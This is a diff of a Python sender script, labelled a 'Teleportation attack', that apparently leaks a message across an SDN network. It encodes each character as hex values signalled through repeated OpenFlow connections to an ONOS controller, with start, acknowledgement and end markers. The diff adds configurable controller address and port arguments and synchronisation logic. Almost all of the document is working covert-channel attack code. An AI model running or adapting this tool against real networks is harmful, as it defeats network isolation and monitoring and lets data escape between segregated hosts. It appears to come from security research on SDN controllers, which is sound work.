@@ -1,36 +1,31 @@
 #!/usr/bin/python3
-from common import *
+# Teleportation attack
+# SENDER script
+from .common import *
+from ipaddress import ip_address
 import time, argparse
 
 
-def main(message):
-
-    start_transmission = False
+def main(controller, port, message):
     # Tell peer that transmission will start
-    while not start_transmission:
-        start_time = time.time()
-        s=connect_onos('127.0.0.1', 6633, 0xEF)
-        time.sleep(0.1)
-        # sending a ECHO_REQUEST to check if the OF connection is still alive
-        echo_req_pkt = OFPTEchoRequest(xid=100)
-        s.send(bytes(echo_req_pkt))
-        time.sleep(0.01)
-        # check if a ECHO_REPLY has been received, if not, transmission has begun
-        pkts = dissect(s.recv(4096))
-        if len(pkts) > 0:
-            for packet in pkts:
-                if packet.type == 3:
-                    print('Sending SoT')
-                    time.sleep(5)
-                    s.close()
-                    start_transmission = True
-        else:
-            s.close()
-        print(time.time() - start_time)
+    print('Starting Transmission...')
+    s, start_transmission = secure_connect(controller, port, 0xEF)
+    time.sleep(2)
+    s.close()
 
-    # Transmit message
+    # Ensure that someone is listening
+    timeout = 0
+    while not check_value(controller, port, 0xDF):
+        if timeout < 3:
+            timeout += 0.250
+            time.sleep(0.250)
+        else:
+            print('No listener, looping...')
+            return None
+    print('Listner is connected, start sending message !')
+
+    # Transmitting message
     for i in range(len(message)):
-        start_time = time.time()
         print('Sending ' + message[i])
 
         # encoding the character in ASCII hex
@@ -38,50 +33,47 @@ def main(message):
         first_hex = int(hex(char_hex[0])[2:3], 16)
         second_hex = int(hex(char_hex[0])[3:4], 16)
 
-        # sending first hex
-        print('sending ' + str(first_hex))
-        s = connect_onos('127.0.0.1', 6633, first_hex)
-        time.sleep(3.6)
-        s.close()
-        print(time.time() - start_time)
-        start_time = time.time()
-
-        # sending second hex
-        print('sending ' + str(second_hex))
-        s = connect_onos('127.0.0.1', 6633, second_hex)
-        time.sleep(3.6)
-        s.close()
-        print(time.time() - start_time)
-
-    end_transmission = False
-    # Tell peer that transmission is done
-    while not end_transmission:
-        start_time = time.time()
-        s=connect_onos('127.0.0.1', 6633, 0xFF)
-        time.sleep(0.1)
-        # sending a ECHO_REQUEST to check if the OF connection is still alive
-        echo_req_pkt = OFPTEchoRequest(xid=100)
-        s.send(bytes(echo_req_pkt))
-        time.sleep(0.01)
-        # check if a ECHO_REPLY has been received, if not, transmission has begun
-        pkts = dissect(s.recv(4096))
-        if len(pkts) > 0:
-            for packet in pkts:
-                if packet.type == 3:
-                    print('Sending EoT')
-                    time.sleep(5)
-                    s.close()
-                    end_transmission = True
-        else:
+        for value in (first_hex, second_hex):
+            # sending first hex
+            print('sending ' + str(value))
+            s, status = secure_connect(controller, port, value+1)
+            time.sleep(0.250)
+            # synchronisation : wait for ACK
+            while not check_value(controller, port, 0xDF):
+                time.sleep(0.250)
+            print('Next...')
             s.close()
-        print(time.time() - start_time)
+    print('Message sent !')
+
+    # Tell peer that transmission is done
+    s, end_transmission = secure_connect(controller, port, 0xFF)
+    time.sleep(5)
+    s.close()
+
     print(f'message "{message}" sent')
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
-    parser.add_argument("--message", help="Message that will be sent to the receiver...",
+    parser.add_argument("--controller", help="IPv4 address used by the remote controller, localhost by default.",
+                        type=str, default='127.0.0.1')
+    parser.add_argument("--port", help="Port used by the remote controller, 6633 by default.",
+                        type=int, default=6633)
+    parser.add_argument("--message", help="Message that will be sent to the receiver.",
                         type=str, required=True)
     args = parser.parse_args()
-
-    while True : main(args.message)
+    # Few checks before we start ...
+    # Controller IP
+    try :
+        controller_ip = ip_address(args.controller)
+    except ValueError:
+        print(f'{args.controller} is not a valid IP Address !')
+        exit()
+    # Controller PORT
+    if not 1 <= args.port <= 65535:
+        print(f'{args.port} is not a valid port, it need to be within the range 1-65535 !')
+        exit()
+    # Loop the transmission, receiver will start to listen when we send the first Start-of-Transmission
+    while True:
+        main(args.controller, args.port, args.message)
+        time.sleep(2)  # Wait two seconds between each try
